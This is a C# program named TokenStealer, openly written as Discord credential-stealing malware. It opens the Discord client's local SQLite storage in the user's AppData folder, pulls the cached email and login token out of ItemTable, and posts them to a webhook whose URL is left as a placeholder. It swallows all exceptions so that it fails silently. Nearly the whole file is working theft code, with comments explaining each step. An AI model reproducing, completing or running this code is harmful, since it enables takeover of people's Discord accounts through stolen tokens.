using System;
using System.Text;
using System.Data.SQLite;
using System.Data;

namespace TokenStealer
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                SQLiteConnection connection = new SQLiteConnection($"Data Source={Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}" + @"\discord\Local Storage\https_discordapp.com_0.localstorage;Version=3;"); //opens up a connection with the Discord SQLite database
                connection.Open(); //opens the connection

                //creates a webhook (i didn't come up with this code btw), and sets the properties
                Webhook hook = new Webhook();
                hook.Name = "webhook name";
                hook.URL = "webhook URL";
                hook.Pfp = "profile picture URL";

                hook.SendMsg($"email: {ExtractInfo(connection, "SELECT * FROM ItemTable", "email_cache")}\ntoken: {ExtractInfo(connection, "SELECT * FROM ItemTable", "token")}"); //sends the information

                connection.Close(); //closes the connection with the database
            }
            catch (Exception) { }
        }

        private static string ExtractInfo(SQLiteConnection connection, string cmd, string key)
        {
            //create a dataset and table for the data
            DataSet set = new DataSet();
            DataTable dTab = new DataTable();
            SQLiteDataAdapter adapter = new SQLiteDataAdapter(cmd, connection); //get the information
            //set the information
            set.Reset();
            adapter.Fill(set);
            dTab = set.Tables[0];

            //return the decoded information
            return Encoding.Unicode.GetString((byte[])GetRow(key, dTab.Rows).ItemArray[1]);
        }

        private static DataRow GetRow(string key, DataRowCollection rows)
        {
            //loops through the rows, and looks for the row with the key
            DataRow result = null;
            foreach (DataRow row in rows)
            {
                if (row.ItemArray[0].ToString() == key)
                    result = row;
            }

            //return the row
            return result;
        }
    }
}
